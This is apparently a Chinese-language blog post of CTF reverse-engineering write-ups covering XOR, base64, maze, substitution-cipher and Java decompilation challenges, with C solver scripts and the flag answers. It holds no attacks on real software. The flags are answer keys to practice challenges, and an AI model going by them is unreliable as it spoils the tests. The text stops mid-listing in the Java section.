&lt;p&gt;使用jd-gui.jar对其进行逆向分析&lt;/p&gt;
&lt;p&gt;在源代码中有com.example.helloword文件夹，用过Java的都知道com.example是什么东西，因此进入该目录下，发现有个MainActivity.class文件，查看源代码，发现有个flag字符串并对其使用了一个比较方法(compareTo)，猜测这个就是需要的flag，提交后发现正确&lt;/p&gt;
&lt;h2 id=&#34;xor&#34;&gt;xor&lt;/h2&gt;
&lt;p&gt;拖入ida进行静态分析，发现对输入进行了异或处理，处理结果符合某个特定的函数值即可求解&lt;/p&gt;
&lt;p&gt;看到一个for循环，是对每个字符与前面一个字符进行异或&lt;/p&gt;
&lt;p&gt;根据异或的性质可知，只需要再异或一次就能还原&lt;/p&gt;
&lt;p&gt;所以从后往前进行异或&lt;/p&gt;
&lt;p&gt;随便写个脚本计算一下：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#include&lt;/span&gt; &lt;span style=&#34;color:#75715e&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;(){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt;];
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;f&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\n&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;k&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\f&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;amp;&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;O&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;7&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;@&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;9&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x11&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;x&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;11&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\r&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;12&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Z&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;13&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;;&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;14&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;U&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;15&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x11&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;p&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x19&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;F&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;19&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x1F&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;20&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;v&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#34;&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;M&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;#&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;24&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;D&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x0E&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;g&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;27&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;6&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;28&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;h&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;29&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;\x0F&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;G&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;31&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;O&amp;#39;&lt;/span&gt;;
    flag[&lt;span style=&#34;color:#ae81ff&#34;&gt;33&lt;/span&gt;] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;--&lt;/span&gt;i) {
        flag[i] &lt;span style=&#34;color:#f92672&#34;&gt;^=&lt;/span&gt; flag[i &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
    }
    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%s&amp;#34;&lt;/span&gt;, flag);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}

&lt;span style=&#34;color:#75715e&#34;&gt;// flag{QianQiuWanDai_YiTongJiangHu}
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reverse3&#34;&gt;reverse3&lt;/h2&gt;
&lt;p&gt;进行初步检查后拖入ida进行静态分析&lt;/p&gt;
&lt;p&gt;发现对于输入内容使用了一个函数进行变换&lt;/p&gt;
&lt;p&gt;查看字符串发现使用了一个&amp;quot;ABCD&amp;hellip;+/=&amp;ldquo;的字符串，猜测使用了BASE64编码&lt;/p&gt;
&lt;p&gt;回到主函数，发现使用了一个&lt;code&gt;str2&lt;/code&gt;与base64后的结果进行比较&lt;/p&gt;
&lt;p&gt;查看字符串可知：&lt;code&gt;str2=e3nifIH9b_C@n@dH&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;明显不是base64的结果&lt;/p&gt;
&lt;p&gt;回到主函数发现对base64结果进行了加法操作&lt;/p&gt;
&lt;p&gt;编程进行反向操作后得到：&lt;code&gt;e2lfbDB2ZV95b3V9&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;使用在线工具可得解码结果：&lt;code&gt;{i_l0ve_you}&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;套上flag提交，通过&lt;/p&gt;
&lt;h2 id=&#34;不一样的flag&#34;&gt;不一样的flag&lt;/h2&gt;
&lt;p&gt;首先测试一下软件&lt;/p&gt;
&lt;p&gt;发现好像是个前进后退的游戏&lt;/p&gt;
&lt;p&gt;猜测是一个迷宫&lt;/p&gt;
&lt;p&gt;进入ida静态分析&lt;/p&gt;
&lt;p&gt;发现当&lt;code&gt;v8[x]==35&lt;/code&gt;时为成功&lt;code&gt;v8[x]==49&lt;/code&gt;时失败&lt;/p&gt;
&lt;p&gt;查阅ASCII发现35对应&lt;code&gt;#&lt;/code&gt;，49对应&lt;code&gt;1&lt;/code&gt;因此查找同时含有这两个字符的字符串：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;*11110100001010000101111#&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;总长度为24，与&lt;code&gt;5*v4+v5&lt;/code&gt;的最大值一致，因此忽略&lt;code&gt;-41&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;要求是不能进入1的位置而到达#&lt;/p&gt;
&lt;p&gt;因此进行简单的推导即可得到要求的序列（完全可以写个代码跑一下，但由于这个题比较简单，直接手算即可）&lt;/p&gt;
&lt;p&gt;得到输入序列：&lt;code&gt;222441144222&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;套上flag提交即可&lt;/p&gt;
&lt;p&gt;注：此题可以看作是一个5*5的迷宫：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;* 1 1 1 1
0 1 0 0 0
0 1 0 1 0
0 0 0 1 0
1 1 1 1 #
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;1是障碍，0是可以走的路，*是起点，#是重点&lt;/p&gt;
&lt;p&gt;这样就与运行程序时的 up, down, left, right 对应上了&lt;/p&gt;
&lt;h2 id=&#34;simplerev&#34;&gt;SimpleRev&lt;/h2&gt;
&lt;p&gt;拖入ida&lt;/p&gt;
&lt;p&gt;发现这道题涉及到类型转换，需要将int转换为char插入到字符串后面&lt;/p&gt;
&lt;p&gt;需要注意的是在转换时要把顺序倒过来&lt;/p&gt;
&lt;p&gt;转换后text为&lt;code&gt;killshadow&lt;/code&gt;，key为&lt;code&gt;ADSFKNDCLS&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;随后将key转换为小写字母，即&lt;code&gt;adsfkndcls&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;编程枚举求解&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; main{
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; text[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;];
    strcpy(text, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;killshadow&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; key[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;];
    strcpy(key, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;adsfkndcls&amp;#34;&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; str2[&lt;span style=&#34;color:#ae81ff&#34;&gt;25&lt;/span&gt;];
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; textlen &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; strlen(text);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; textlen; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i) {
        &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;A&amp;#39;&lt;/span&gt;; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;z&amp;#39;&lt;/span&gt;; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;c) {
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;96&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;122&lt;/span&gt;) {
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;64&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; c &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;90&lt;/span&gt;) {
                    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(text[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;) {
                        printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d%c &amp;#34;&lt;/span&gt;, i, c);
                    }
                }
            }
            &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; {
                &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt;(text[i] &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (c &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;39&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; key[i] &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;26&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;97&lt;/span&gt;) {
                    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;%d%c &amp;#34;&lt;/span&gt;, i, c);
                }
            }
        }
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;每个位置均可以算出两个解，一个是大写字母，一个是小写字母&lt;/p&gt;
&lt;p&gt;全部挑选大写字母后提交，可以通过&lt;/p&gt;
&lt;p&gt;想尝试一下其它组合方案是否也可以，但可惜提交平台不允许多次提交&lt;/p&gt;
&lt;h2 id=&#34;java逆向解密&#34;&gt;Java逆向解密&lt;/h2&gt;
&lt;p&gt;将.class文件拖入jd-gui.jar中进行逆向&lt;/p&gt;
&lt;p&gt;可以得到Reverse.class源代码：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.ArrayList&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; java.util.Scanner&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;

&lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Reverse&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;main&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;String&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; args&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    Scanner s &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; Scanner&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;in&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Please input the flag );
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    String str = s.next();
&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;    System.out.println(&amp;#34;&lt;/span&gt;Your input is &lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    System&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;out&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;println&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;str&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; stringArr &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; str&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toCharArray&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;();&lt;/span&gt;
    Encrypt&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;stringArr&lt;span style=&#34;color:#f92672&#34;&gt;);&lt;/span&gt;
  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
  
  &lt;span style=&#34;color:#66d9ef&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Encrypt&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; arr&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
    ArrayList&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;Integer&lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;&lt;/span&gt; Resultlist &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; ArrayList&lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&amp;gt;();&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; 0&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; arr&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;length&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt; i&lt;span style=&#34;color:#f92672&#34;&gt;++)&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
      &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; result &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; arr&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;i&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; 64 &lt;span style=&#34;color:#f92672&#34;&gt;^&lt;/span&gt; 0x20&lt;span style=&#34;color:#f92672&#34;&gt;;&lt;/span&gt;
      Resultlist&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;Integer&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;valueOf&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;result&lt;span style=&#34;color:#f92672&#34;&gt;));&lt;/span&gt;
    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; 
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[]&lt;/span&gt; KEY &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; 
        180&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 136&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 137&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 147&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 191&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 137&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 147&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 191&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 148&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 136&lt;span style=&#34;color:#f92672&#34;&gt;,&lt;/span&gt; 
